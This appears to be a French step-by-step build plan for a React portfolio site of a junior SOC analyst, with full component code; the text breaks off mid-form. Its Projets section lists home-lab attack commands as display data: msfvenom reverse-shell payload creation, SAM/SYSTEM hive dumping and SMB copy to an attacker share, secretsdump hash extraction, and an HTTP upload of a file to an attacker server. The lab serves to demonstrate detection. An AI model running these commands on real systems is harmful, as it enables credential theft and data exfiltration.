# Second portfolio (thème alerte rouge) — Plan d'implémentation

> **Pour un exécutant automatisé :** utiliser superpowers:subagent-driven-development (recommandé) ou superpowers:executing-plans pour exécuter ce plan tâche par tâche. Les étapes utilisent la syntaxe case à cocher (`- [ ]`).

**Objectif :** Construire un second portfolio React, séparé du premier (`portfolio-soc`), avec une identité visuelle rouge/noir "alerte", inspirée structurellement de https://chrupek.fr/, en réutilisant le contenu réel déjà écrit dans le premier portfolio (aucune information inventée).

**Architecture :** Application React à page unique (comme le premier portfolio). `App.jsx` assemble 6 sections dans l'ordre : `Navbar` (fixe) → `Hero` → `Profil` → `Competences` → `Projets` → `Contact` → `Footer`.

**Tech Stack :** React 18, Vite, TailwindCSS v3, Framer Motion, Bootstrap Icons (CDN). Déjà scaffoldé et installé dans `C:\Users\ESHU\portfolio-soc-alert\` (voir Task 0, déjà fait).

**Écart par rapport au modèle standard de ce guide :** pas de suite de tests automatisés ni de linter dans ce projet (même choix que le premier portfolio). Chaque tâche est vérifiée par `npm run build` (aucune erreur de compilation) puis vérification visuelle dans le navigateur.

Référence design : `docs/superpowers/specs/2026-07-09-second-portfolio-design.md`

---

### Task 0 : Scaffold initial — DÉJÀ FAIT

`package.json`, `vite.config.js`, `postcss.config.js`, `tailwind.config.js`, `index.html`, `src/index.css`, `src/main.jsx`, `vercel.json`, `public/favicon.svg`, `public/profil.png`, `public/CV-CHERY-Jean-Hadley-SOC-Analyst.pdf` sont déjà en place. `npm install` déjà exécuté. Dépôt git local initialisé et premier commit fait (`34ff472`). Rien à faire ici.

---

### Task 1 : Navbar

**Fichiers :**
- Créer : `src/components/Navbar.jsx`

- [ ] **Étape 1 : Créer le composant**

```jsx
import { useState, useEffect } from 'react'
import { motion } from 'framer-motion'

const LINKS = [
  { href: '#profil', label: 'Profil' },
  { href: '#competences', label: 'Compétences' },
  { href: '#projets', label: 'Projets' },
  { href: '#contact', label: 'Contact' },
]

export default function Navbar() {
  const [scrolled, setScrolled] = useState(false)
  const [open, setOpen] = useState(false)

  useEffect(() => {
    const onScroll = () => setScrolled(window.scrollY > 20)
    window.addEventListener('scroll', onScroll, { passive: true })
    return () => window.removeEventListener('scroll', onScroll)
  }, [])

  return (
    <motion.nav
      initial={{ y: -52, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      transition={{ duration: 0.4, ease: 'easeOut' }}
      className={`fixed top-0 inset-x-0 z-50 transition-all duration-300 ${
        scrolled ? 'bg-surface/95 backdrop-blur border-b border-divider' : ''
      }`}
    >
      <div className="max-w-6xl mx-auto px-6 sm:px-10 flex items-center justify-between h-14">
        <a href="#home" className="font-display text-lg font-bold text-accent tracking-wide uppercase">
          JH Chery
        </a>

        <div className="hidden sm:flex items-center gap-8">
          {LINKS.map(l => (
            <a
              key={l.href}
              href={l.href}
              className="text-sm text-zinc-400 hover:text-zinc-100 transition-colors duration-150"
            >
              {l.label}
            </a>
          ))}
        </div>

        <button
          className="sm:hidden text-zinc-500 hover:text-zinc-100 p-1"
          onClick={() => setOpen(o => !o)}
          aria-label="Menu"
        >
          <i className={open ? 'bi bi-x-lg text-xl' : 'bi bi-list text-2xl'} />
        </button>
      </div>

      {open && (
        <div className="sm:hidden bg-surface border-b border-divider px-6 pb-5 pt-2 flex flex-col gap-4">
          {LINKS.map(l => (
            <a
              key={l.href}
              href={l.href}
              onClick={() => setOpen(false)}
              className="text-sm text-zinc-400 hover:text-zinc-100 transition-colors"
            >
              {l.label}
            </a>
          ))}
        </div>
      )}
    </motion.nav>
  )
}
```

- [ ] **Étape 2 : Vérifier**

Ce composant n'est pas encore utilisé (pas de `App.jsx` fonctionnel) — vérifier seulement qu'il n'y a pas d'erreur de syntaxe : `npx vite build` échouera probablement à cause de l'absence de `App.jsx`/`main.jsx` valides tant que les autres tâches ne sont pas faites. Passer directement à la Task 2 sans bloquer ici.

- [ ] **Étape 3 : Commit**

```bash
git add src/components/Navbar.jsx
git commit -m "feat: ajouter la barre de navigation"
```

---

### Task 2 : Hero (bannière d'accueil)

**Fichiers :**
- Créer : `src/components/Hero.jsx`

- [ ] **Étape 1 : Créer le composant**

```jsx
import { useState, useEffect, useRef } from 'react'
import { motion } from 'framer-motion'

const ROLES = [
  'SOC Analyst Junior',
  'Threat Detection',
  'Incident Response',
  'SIEM Engineering',
]

function Typewriter({ words }) {
  const [text, setText] = useState(words[0])
  const [wIdx, setWIdx] = useState(0)
  const [cIdx, setCIdx] = useState(words[0].length)
  const [deleting, setDeleting] = useState(false)
  const timer = useRef(null)

  useEffect(() => {
    const word = words[wIdx % words.length]
    const delay = deleting ? 40 : 90
    timer.current = setTimeout(() => {
      if (!deleting) {
        if (cIdx < word.length) {
          setText(word.slice(0, cIdx + 1))
          setCIdx(c => c + 1)
        } else {
          setTimeout(() => setDeleting(true), 2000)
        }
      } else {
        if (cIdx > 0) {
          setText(word.slice(0, cIdx - 1))
          setCIdx(c => c - 1)
        } else {
          setDeleting(false)
          setWIdx(w => w + 1)
        }
      }
    }, delay)
    return () => clearTimeout(timer.current)
  }, [cIdx, deleting, wIdx, words])

  return (
    <span>
      {text}
      <span className="animate-blink text-accent ml-0.5">|</span>
    </span>
  )
}

export default function Hero() {
  return (
    <section id="home" className="relative min-h-screen flex flex-col justify-center overflow-hidden hero-grid">
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div
          className="absolute inset-0 bg-cover bg-center animate-slow-zoom"
          style={{ backgroundImage: "url('/profil.png')" }}
        />
      </div>
      <div className="absolute inset-0 bg-black/75 pointer-events-none" />

      <div className="relative z-10 max-w-6xl mx-auto px-6 sm:px-10 pt-20 pb-16 w-full">
        <motion.div
          initial={{ opacity: 0, y: 24 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, ease: 'easeOut' }}
        >
          <p className="text-xs font-medium uppercase tracking-[0.25em] text-zinc-500 mb-5">
            Portfolio — Cybersécurité SOC
          </p>

          <h1
            className="font-display font-extrabold uppercase text-hero leading-none mb-4"
            style={{ letterSpacing: '-0.01em' }}
          >
            <span className="text-zinc-100">CHERY</span>
            {' '}
            <span className="text-accent name-glow">Jean-Hadley</span>
          </h1>

          <p className="font-display font-bold text-hero-sub text-zinc-300 mb-6">
            <Typewriter words={ROLES} />
          </p>

          <p className="text-zinc-400 text-base sm:text-lg max-w-xl leading-relaxed mb-10">
            Développeur en reconversion cybersécurité. Lab SOC complet monté de A à Z —
            Wazuh 4.12, Active Directory, Kali. Détection de menaces prouvée, cas par cas.
          </p>

          <div className="flex flex-wrap gap-4">
            <a
              href="#projets"
              className="bg-accent text-bg text-sm font-semibold px-7 py-3
                hover:bg-accent/90 active:scale-95 transition-all duration-150"
            >
              Voir mes projets
            </a>
            <a
              href="#contact"
              className="border border-accent text-accent text-sm font-semibold px-7 py-3
                hover:bg-accent-dim active:scale-95 transition-all duration-150"
            >
              Me contacter
            </a>
          </div>
        </motion.div>
      </div>
    </section>
  )
}
```

- [ ] **Étape 2 : Créer un `App.jsx` minimal temporaire pour pouvoir builder**

Ce fichier sera remplacé en Task 8 — but ici juste vérifier que Hero compile.

```jsx
import Hero from './components/Hero'

export default function App() {
  return <Hero />
}
```

- [ ] **Étape 3 : Vérifier**

Run: `npm run build` → doit réussir sans erreur.

- [ ] **Étape 4 : Commit**

```bash
git add src/components/Hero.jsx src/App.jsx
git commit -m "feat: ajouter la banniere d'accueil avec fond zoome"
```

---

### Task 3 : Profil

**Fichiers :**
- Créer : `src/components/Profil.jsx`

- [ ] **Étape 1 : Créer le composant**

Contenu de bio et de frise repris tel quel de `portfolio-soc/src/components/About.jsx` (aucune nouvelle information) :

```jsx
import { motion } from 'framer-motion'

const fadeUp = (delay = 0) => ({
  initial: { opacity: 0, y: 24 },
  whileInView: { opacity: 1, y: 0 },
  viewport: { once: true },
  transition: { duration: 0.55, delay },
})

const ETAPES = [
  { titre: 'Formation initiale', texte: 'Développement logiciel' },
  { titre: 'Reconversion', texte: 'Cybersécurité SOC' },
  { titre: 'Lab monté', texte: 'VirtualBox + Wazuh + AD + Kali' },
  { titre: 'Statut', texte: 'Disponible — 1er poste SOC Junior' },
]

const COULEURS = ['#ff2b2b', '#ff5b1f', '#ff7a12', '#ff8c00']

const item = {
  initial: { opacity: 0, y: 24 },
  whileInView: { opacity: 1, y: 0 },
  viewport: { once: true },
}

export default function Profil() {
  return (
    <section id="profil" className="py-24 px-6 max-w-6xl mx-auto">
      <motion.div {...fadeUp()} className="mb-12">
        <p className="text-xs font-medium uppercase tracking-[0.2em] text-accent mb-3">
          Profil
        </p>
        <h2 className="font-display font-bold text-4xl sm:text-5xl text-zinc-100 uppercase">
          Qui suis-je
        </h2>
      </motion.div>

      <div className="grid lg:grid-cols-5 gap-12 items-start mb-20">
        <motion.div {...fadeUp(0.1)} className="lg:col-span-2">
          <img
            src="/profil.png"
            alt="Photo de profil de CHERY Jean-Hadley"
            className="w-full rounded-sm border-2 border-accent object-cover"
          />
        </motion.div>

        <motion.div {...fadeUp(0.2)} className="lg:col-span-3 space-y-5">
          <p className="text-zinc-300 leading-relaxed text-lg">
            Développeur de formation, j'ai choisi de me reconvertir vers la{' '}
            <strong className="text-zinc-100 font-semibold">cybersécurité SOC</strong> — attiré
            par la détection de menaces, l'investigation d'incidents et la défense des systèmes.
          </p>
          <p className="text-zinc-400 leading-relaxed">
            Pour valider mes compétences de manière concrète, j'ai monté un{' '}
            <strong className="text-zinc-300 font-medium">lab SOC complet de A à Z</strong> :{' '}
            VirtualBox, Wazuh 4.12.0 en Docker/WSL2, un Active Directory Windows Server 2022 et
            Kali Linux comme machine attaquante sur un réseau isolé.
          </p>
          <p className="text-zinc-400 leading-relaxed">
            Dans ce lab, je reproduis des techniques d'attaque réelles référencées dans le
            framework MITRE ATT&CK, je construis les règles de détection Wazuh, et je prouve que
            les alertes se déclenchent — de bout en bout, en conditions réelles.
          </p>
          <p className="text-zinc-400 leading-relaxed">
            Je cherche un{' '}
            <span className="text-accent font-semibold">premier poste de SOC Analyst Junior</span>{' '}
            pour continuer à apprendre au contact d'une équipe Blue Team.
          </p>

          <div className="flex flex-wrap gap-3 pt-3">
            <a
              href="/CV-CHERY-Jean-Hadley-SOC-Analyst.pdf"
              target="_blank"
              rel="noopener noreferrer"
              className="text-sm bg-accent text-bg font-semibold px-5 py-2.5
                hover:bg-accent/90 transition-colors duration-200"
            >
              Télécharger mon CV
            </a>
            <a
              href="https://www.linkedin.com/in/hadley-chery/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-sm border border-divider text-zinc-400 px-5 py-2.5
                hover:border-accent hover:text-accent transition-colors duration-200"
            >
              LinkedIn →
            </a>
          </div>
        </motion.div>
      </div>

      <motion.div {...fadeUp()} className="mb-10">
        <h3 className="font-display font-bold text-2xl text-zinc-100 uppercase">
          Mon parcours de reconversion
        </h3>
      </motion.div>

      <div className="relative max-w-3xl mx-auto">
        {ETAPES.map((etape, i) => (
          <motion.div
            key={etape.titre}
            variants={item}
            initial="initial"
            whileInView="whileInView"
            viewport={{ once: true }}
            transition={{ duration: 0.45, delay: i * 0.1 }}
            className="relative bg-surface border border-divider p-6 mb-12 last:mb-0"
            style={{ borderTopColor: COULEURS[i], borderTopWidth: '3px' }}
          >
            {i > 0 && (
              <div
                className="absolute left-1/2 -translate-x-1/2 -top-8 w-0 h-0"
                style={{
                  borderLeft: '14px solid transparent',
                  borderRight: '14px solid transparent',
                  borderBottom: `14px solid ${COULEURS[i]}`,
                }}
              />
            )}
            <h4 className="font-display font-semibold text-lg text-zinc-100 mb-1">
              {etape.titre}
            </h4>
            <p className="text-sm text-zinc-400">{etape.texte}</p>
          </motion.div>
        ))}
      </div>
    </section>
  )
}
```

- [ ] **Étape 2 : Mettre à jour `App.jsx` temporaire**

```jsx
import Hero from './components/Hero'
import Profil from './components/Profil'

export default function App() {
  return (
    <>
      <Hero />
      <Profil />
    </>
  )
}
```

- [ ] **Étape 3 : Vérifier**

Run: `npm run build` → doit réussir sans erreur.

- [ ] **Étape 4 : Commit**

```bash
git add src/components/Profil.jsx src/App.jsx
git commit -m "feat: ajouter la section Profil (bio, photo, frise de parcours)"
```

---

### Task 4 : Compétences

**Fichiers :**
- Créer : `src/components/Competences.jsx`

- [ ] **Étape 1 : Créer le composant**

Contenu regroupé à partir des 12 outils réels déjà documentés dans `portfolio-soc/src/components/Stack.jsx` — aucun outil inventé.

```jsx
import { motion } from 'framer-motion'

const CATEGORIES = [
  {
    icon: 'bi-shield-fill-check',
    titre: 'Détection & SIEM',
    texte: "Déploiement et configuration de Wazuh 4.12 (SIEM open-source) : écriture de règles de détection personnalisées, tests de déclenchement prouvés de bout en bout. Techniques d'attaque reproduites et cartographiées selon le framework MITRE ATT&CK.",
  },
  {
    icon: 'bi-hdd-rack-fill',
    titre: 'Système & Infrastructure',
    texte: "Administration Windows Server 2022 avec Active Directory, virtualisation du lab complet sous VirtualBox, conteneurisation du SIEM avec Docker sous WSL2.",
  },
  {
    icon: 'bi-bug-fill',
    titre: 'Outils offensifs',
    texte: "Utilisation de Kali Linux, Metasploit et msfvenom pour reproduire des attaques réelles (phishing, exfiltration, credential dumping), et d'Impacket pour la post-exploitation — en conditions réelles, Defender actif.",
  },
  {
    icon: 'bi-diagram-3-fill',
    titre: 'Réseau & Analyse',
    texte: "Capture et analyse de trafic réseau avec Wireshark/tshark, reconnaissance et scan avec Nmap — identification de signatures d'attaque (scan SYN, exfiltration HTTP).",
  },
  {
    icon: 'bi-terminal-fill',
    titre: 'Scripting',
    texte: "Automatisation et exploitation via PowerShell côté Windows, Bash côté Linux.",
  },
]

const container = {
  whileInView: { transition: { staggerChildren: 0.08 } },
  viewport: { once: true },
}
const item = {
  initial: { opacity: 0, y: 20 },
  whileInView: { opacity: 1, y: 0 },
  transition: { duration: 0.4 },
}

export default function Competences() {
  return (
    <section id="competences" className="py-24 px-6 max-w-6xl mx-auto">
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.5 }}
        className="mb-12 text-center"
      >
        <p className="text-xs font-medium uppercase tracking-[0.2em] text-accent mb-3">
          Compétences
        </p>
        <h2 className="font-display font-bold text-4xl sm:text-5xl text-zinc-100 uppercase">
          Mes domaines
        </h2>
      </motion.div>

      <motion.div
        variants={container}
        initial="initial"
        whileInView="whileInView"
        viewport={{ once: true }}
        className="grid sm:grid-cols-2 lg:grid-cols-3 gap-6"
      >
        {CATEGORIES.map(c => (
          <motion.div
            key={c.titre}
            variants={item}
            className="bg-surface border border-divider p-8 text-center
              hover:border-accent/50 transition-colors duration-200"
          >
            <span className="inline-flex items-center justify-center w-16 h-16 rounded-full
              bg-accent-dim border border-accent/40 mb-4">
              <i className={`bi ${c.icon} text-2xl text-accent`} />
            </span>
            <h3 className="font-display font-bold text-lg text-zinc-100 uppercase mb-3">
              {c.titre}
            </h3>
            <p className="text-sm text-zinc-400 leading-relaxed">{c.texte}</p>
          </motion.div>
        ))}
      </motion.div>
    </section>
  )
}
```

- [ ] **Étape 2 : Mettre à jour `App.jsx` temporaire**

```jsx
import Hero from './components/Hero'
import Profil from './components/Profil'
import Competences from './components/Competences'

export default function App() {
  return (
    <>
      <Hero />
      <Profil />
      <Competences />
    </>
  )
}
```

- [ ] **Étape 3 : Vérifier**

Run: `npm run build` → doit réussir sans erreur.

- [ ] **Étape 4 : Commit**

```bash
git add src/components/Competences.jsx src/App.jsx
git commit -m "feat: ajouter la section Competences par categories"
```

---

### Task 5 : Projets

**Fichiers :**
- Créer : `src/components/Projets.jsx`

- [ ] **Étape 1 : Créer le composant**

Les 5 cas et toutes leurs données factuelles (règles Wazuh, technique MITRE, commandes, détection, leçon) sont repris **à l'identique** de `portfolio-soc/src/components/Projects.jsx` — même contenu réel, structure accordéon identique, seule la couleur décorative change (rouge au lieu de vert/cyan via les tokens Tailwind de ce projet).

```jsx
import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'

const SEV = {
  critical: { label: 'CRITICAL', bar: 'bg-critical', text: 'text-critical', border: 'border-l-critical' },
  high:     { label: 'HIGH',     bar: 'bg-high',     text: 'text-high',     border: 'border-l-high' },
  medium:   { label: 'MEDIUM',   bar: 'bg-medium',   text: 'text-medium',   border: 'border-l-medium' },
}

const PROJECTS = [
  {
    id: 1,
    title: 'Évasion Antivirus & Détection Wazuh',
    sev: 'high',
    rules: ['62123 (niv.12)', '62124 (niv.3)'],
    mitre: 'T1562 — Impair Defenses',
    technique: 'msfvenom + encodage shikata_ga_nai',
    date: '2026-06-10',
    summary: "Payload msfvenom brut encodé 5 fois, livré via HTTP sur Windows Server 2022. Defender bloque à l'écriture. Wazuh déclenche deux règles — la chaîne de détection est complète même sans session établie.",
    steps: [
      'msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe',
      'python3 -m http.server 8080  (Kali)',
      'Invoke-WebRequest ... (WinServer2022) — Defender bloque',
    ],
    detection: [
      'Rule 62123 niv.12  —  Windows Defender: Malware detected',
      'Rule 62124 niv.3   —  Windows Defender: Threat blocked',
    ],
    lesson: "Un payload brut msfvenom est détecté instantanément par les AV modernes. Sans obfuscation avancée, zéro chance de passer.",
  },
  {
    id: 2,
    title: 'Credential Dumping — SAM / NTLM',
    sev: 'critical',
    rules: ['92026 (niv.14)'],
    mitre: 'T1003.002 — OS Credential Dumping',
    technique: 'reg.exe + Impacket secretsdump',
    date: '2026-06-14',
    summary: "Export des ruches SAM et SYSTEM via reg.exe, exfiltration SMB vers Kali, extraction des hachages NTLM avec secretsdump. Alerte Wazuh niveau 14 — critique maximum.",
    steps: [
      'reg save HKLM\\SAM C:\\Temp\\sam.hive',
      'reg save HKLM\\SYSTEM C:\\Temp\\system.hive',
      'copy .\\sam.hive \\\\kali\\share  (exfil SMB)',
      'secretsdump.py LOCAL -sam sam.hive -system system.hive  (Kali)',
    ],
    detection: [
      'Rule 92026 niv.14  —  reg.exe: SAM hive dump detected  [CRITICAL]',
    ],
    lesson: "reg.exe ciblant SAM est un IoC critique immédiat. Niveau 14 = alerte maximale, déclencherait une réponse aux incidents en production.",
  },
  {
    id: 3,
    title: 'Exfiltration HTTP non chiffrée',
    sev: 'critical',
    rules: ['100010 (niv.12)', '100011 (niv.14)'],
    mitre: 'T1048.003 — Exfiltration Over Unencrypted Protocol',
    technique: 'PowerShell Invoke-WebRequest vers HTTP python3',
    date: '2026-06-15',
    summary: "Données sensibles transmises depuis Windows Server via PowerShell vers un serveur HTTP sur Kali. Deux règles corrélées reconstituent la chaîne complète.",
    steps: [
      'python3 -m http.server 8888  (Kali)',
      'Invoke-WebRequest -Uri http://192.168.56.100:8888 -InFile secret.txt  (WinServer2022)',
    ],
    detection: [
      'Rule 100010 niv.12  —  PowerShell: outbound network connection',
      'Rule 100011 niv.14  —  Network: exfiltration port 8888 non-standard',
    ],
    lesson: "Corréler deux alertes distinctes pour reconstruire le scénario d'attaque — c'est exactement le cœur du métier d'analyste SOC.",
  },
  {
    id: 4,
    title: 'Phishing msfvenom — Chaîne complète',
    sev: 'high',
    rules: ['62123 (niv.12)', '62124 (niv.3)'],
    mitre: 'T1566 — Phishing',
    technique: 'Payload .exe déguisé en facture, livraison HTTP',
    date: '2026-06-18',
    summary: "Simulation phishing bout-en-bout : facture_2026.exe créé, hébergé sur Kali, téléchargé et lancé sur la cible. Defender identifie Trojan:Win32/Zusy.NCD!MTB et bloque.",
    steps: [
      'msfvenom ... -o facture_2026.exe',
      'python3 -m http.server 8080  (Kali)',
      'Invoke-WebRequest + Start-Process facture_2026.exe  (WinServer2022)',
    ],
    detection: [
      'Rule 62123 niv.12  —  Defender: Trojan:Win32/Zusy.NCD!MTB detected',
      'Rule 62124 niv.3   —  Defender: Threat blocked',
    ],
    lesson: "Un payload msfvenom brut déguisé en document est reconnu instantanément. Les attaquants réels combinent packing, obfuscation et living-off-the-land.",
  },
  {
    id: 5,
    title: 'Network Discovery — Détection scan Nmap',
    sev: 'medium',
    rules: ['100012 (niv.10)', '100013 (niv.10)'],
    mitre: 'T1046 — Network Service Discovery',
    technique: 'Capture tshark + analyse signature SYN Nmap',
    date: '2026-07-06',
    summary: "Capture réseau avec tshark pendant un scan Nmap SYN stealth. 2117 paquets TCP SYN capturés. La signature est identifiable en quelques secondes dans le pcap.",
    steps: [
      'tshark -i eth1 -w capture.pcap  (Kali)',
      'nmap -sS -p 1-65535 192.168.56.101  (Kali)',
      'Analyse : SYN sans SYN-ACK → 2117 paquets → pattern scan',
    ],
    detection: [
      'Rule 100012 niv.10  —  Network: Nmap SYN scan detected',
      'Rule 100013 niv.10  —  Network: Port sweep detected',
    ],
    lesson: "Reconnaître un scan Nmap dans une capture réseau (SYN sans SYN-ACK, masse de ports, courte durée) est une compétence fondamentale SOC.",
  },
]

function Card({ p, idx }) {
  const [open, setOpen] = useState(false)
  const s = SEV[p.sev]

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.45, delay: idx * 0.06 }}
      className={`bg-surface border border-divider border-l-4 ${s.border} overflow-hidden`}
    >
      <button
        onClick={() => setOpen(o => !o)}
        className="w-full text-left px-6 py-5 hover:bg-elevated/30 transition-colors duration-150"
        aria-expanded={open}
      >
        <div className="flex items-start gap-4 justify-between">
          <div className="flex-1 min-w-0">
            <div className="flex flex-wrap items-center gap-2.5 mb-3">
              <span className={`text-xs font-semibold uppercase tracking-wider ${s.text}`}>
                {s.label}
              </span>
              <span className="text-zinc-700">·</span>
              <span className="text-xs text-accent font-medium">Détection prouvée ✓</span>
              {p.rules.map(r => (
                <span key={r} className="text-xs text-zinc-600">
                  Rule {r}
                </span>
              ))}
            </div>

            <h3 className="font-display font-bold text-xl sm:text-2xl text-zinc-100 leading-tight mb-2">
              {p.title}
            </h3>

            <p className="text-xs text-zinc-500 uppercase tracking-wide">
              {p.mitre} &nbsp;·&nbsp; {p.technique}
            </p>
          </div>

          <motion.span
            animate={{ rotate: open ? 180 : 0 }}
            transition={{ duration: 0.2 }}
            className="text-zinc-600 text-xl mt-1 flex-shrink-0"
          >
            ↓
          </motion.span>
        </div>

        <p className="text-zinc-400 text-sm mt-3 leading-relaxed text-left">{p.summary}</p>
      </button>

      <AnimatePresence initial={false}>
        {open && (
          <motion.div
            key="detail"
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.25, ease: 'easeInOut' }}
            className="overflow-hidden"
          >
            <div className="px-6 pb-6 pt-5 border-t border-divider space-y-5">
              <div>
                <p className="text-xs uppercase tracking-widest text-zinc-600 mb-2.5">
                  Commandes exécutées
                </p>
                <div className="bg-bg border border-divider p-4 space-y-2">
                  {p.steps.map((step, i) => (
                    <p key={i} className="font-mono text-xs text-zinc-300 leading-relaxed">
                      <span className="text-zinc-700 select-none mr-2">{i + 1}.</span>
                      {step}
                    </p>
                  ))}
                </div>
              </div>

              <div>
                <p className="text-xs uppercase tracking-widest text-zinc-600 mb-2.5">
                  Alertes déclenchées
                </p>
                <div className="space-y-2">
                  {p.detection.map((d, i) => (
                    <div key={i} className="flex items-start gap-2.5">
                      <span className="text-accent text-sm mt-px">✓</span>
                      <span className="font-mono text-xs text-zinc-200 leading-relaxed">{d}</span>
                    </div>
                  ))}
                </div>
              </div>

              <div>
                <p className="text-xs uppercase tracking-widest text-zinc-600 mb-2.5">
                  Leçon SOC
                </p>
                <p className="text-sm text-zinc-400 leading-relaxed border-l-2 border-accent pl-4">
                  {p.lesson}
                </p>
              </div>

              <p className="text-xs text-zinc-700 text-right">{p.date}</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

export default function Projets() {
  return (
    <section id="projets" className="py-24 px-6 max-w-6xl mx-auto">
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.5 }}
        className="mb-12"
      >
        <p className="text-xs font-medium uppercase tracking-[0.2em] text-accent mb-3">
          Projets
        </p>
        <h2 className="font-display font-bold text-4xl sm:text-5xl text-zinc-100 uppercase">
          Lab SOC en action
        </h2>
        <p className="text-zinc-500 mt-3 max-w-xl leading-relaxed">
          Cinq attaques réelles reproduites dans le lab, avec la chaîne de détection Wazuh
          prouvée bout en bout. Cliquer sur une carte pour les détails.
        </p>
      </motion.div>

      <div className="space-y-3">
        {PROJECTS.map((p, i) => <Card key={p.id} p={p} idx={i} />)}
      </div>
    </section>
  )
}
```

- [ ] **Étape 2 : Mettre à jour `App.jsx` temporaire**

```jsx
import Hero from './components/Hero'
import Profil from './components/Profil'
import Competences from './components/Competences'
import Projets from './components/Projets'

export default function App() {
  return (
    <>
      <Hero />
      <Profil />
      <Competences />
      <Projets />
    </>
  )
}
```

- [ ] **Étape 3 : Vérifier**

Run: `npm run build` → doit réussir sans erreur.

- [ ] **Étape 4 : Commit**

```bash
git add src/components/Projets.jsx src/App.jsx
git commit -m "feat: ajouter la section Projets (accordeon, 5 cas du lab)"
```

---

### Task 6 : Contact

**Fichiers :**
- Créer : `src/components/Contact.jsx`

- [ ] **Étape 1 : Créer le composant**

Même structure que `portfolio-soc/src/components/Contact.jsx` (formulaire Formspree + liens), recolorée.

```jsx
import { useState } from 'react'
import { motion } from 'framer-motion'

// Remplacer YOUR_FORM_ID après inscription sur formspree.io
const FORMSPREE = 'https://formspree.io/f/YOUR_FORM_ID'

const LINKS = [
  { label: 'CV', value: 'Voir en ligne', href: '/CV-CHERY-Jean-Hadley-SOC-Analyst.pdf', external: true },
  { label: 'Email', value: 'jhadleyc@mail.com', href: 'mailto:jhadleyc@mail.com' },
  { label: 'LinkedIn', value: 'linkedin.com/in/hadley-chery', href: 'https://www.linkedin.com/in/hadley-chery/', external: true },
  { label: 'GitHub', value: 'github.com/j-Hadley-C', href: 'https://github.com/j-Hadley-C', external: true },
]

export default function Contact() {
  const [form, setForm] = useState({ name: '', email: '', message: '' })
  const [status, setStatus] = useState('idle')

  const onChange = e => setForm(f => ({ ...f, [e.target.name]: e.target.value }))

  const onSubmit = async e => {
    e.preventDefault()
    setStatus('sending')
    try {
      const res = await fetch(FORMSPREE, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
        body: JSON.stringify(form),
      })
      setStatus(res.ok ? 'success' : 'error')
      if (res.ok) setForm({ name: '', email: '', message: '' })
    } catch {
      setStatus('error')
    }
  }

  return (
    <section id="contact" className="py-24 px-6 max-w-6xl mx-auto">
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.5 }}
        className="mb-12"
      >
        <p className="text-xs font-medium uppercase tracking-[0.2em] text-accent mb-3">
          Contact
        </p>
        <h2 className="font-display font-bold text-4xl sm:text-5xl text-zinc-100 uppercase">
          Travaillons ensemble
        </h2>
        <p className="text-zinc-500 mt-3 max-w-md leading-relaxed">
          Disponible pour un poste SOC Junior, un stage ou tout échange autour de la
          cybersécurité.
        </p>
      </motion.div>

      <div className="grid lg:grid-cols-2 gap-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.5, delay: 0.1 }}
          className="space-y-3"
        >
          {LINKS.map(l => (
            <a
              key={`${l.label}-${l.value}`}
              href={l.href}
              target={l.external ? '_blank' : undefined}
              rel={l.external ? 'noopener noreferrer' : undefined}
              className="flex items-center gap-5 p-5 bg-surface border border-divider
                hover:border-accent/50 hover:bg-elevated/40 transition-all duration-200 group"
            >
              <span className="text-xs text-zinc-600 uppercase tracking-wider w-16 flex-shrink-0">
                {l.label}
              </span>
              <span className="text-sm text-zinc-300 group-hover:text-accent transition-colors truncate">
                {l.value}
              </span>
              <span className="ml-auto text-zinc-700 group-hover:text-accent transition-colors flex-shrink-0 text-lg">
                →
              </span>
            </a>
          ))}

          <div className="mt-4 p-4 border border-accent/20 bg-accent-dim/30">
            <p className="text-sm text-accent font-semibold">Disponible — Immédiatement</p>
            <p className="text-xs text-zinc-500 mt-1">
              En recherche active d'un premier poste SOC Analyst Junior.
            </p>
          </div>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.5, delay: 0.2 }}
        >
          {status === 'success' ? (
            <div className="min-h-[280px] flex flex-col items-center justify-center
              bg-surface border border-accent/30 p-8 text-center">
              <span className="text-accent text-4xl mb-4">✓</span>
              <p className="font-display font-bold text-xl text-zinc-100 mb-2 uppercase">
                Message envoyé
              </p>
              <p className="text-sm text-zinc-500">Je vous répondrai dès que possible.</p>
              <button
                onClick={() => setStatus('idle')}
                className="mt-6 text-xs text-zinc-600 hover:text-accent transition-colors"
              >
                Envoyer un autre message
              </button>
            </div>
          ) : (
            <form onSubmit={onSubmit} className="space-y-4">
              {[
                { name: 'name',  label: 'Nom',   type: 'text',  ph: 'Votre nom' },
                { name: 'email', label: 'Email', type: 'email', ph: 'votre@email.com' },
              ].map(f => (
                <div key={f.name}>
                  <label className="text-xs uppercase tracking-wider text-zinc-500 block mb-2">
                    {f.label}
                  </label>
                  <input
                    type={f.type}
                    name={f.name}
                    value={form[f.name]}
                    onChange={onChange}
                    placeholder={f.ph}
                    required
                    className="w-full bg-surface border border-divider text-zinc-100 text-sm
                      px-4 py-3 focus:outline-none focus:border-accent transition-colors
                      placeholder:text-zinc-700"
                  />
                </div>
              ))}

              <div>
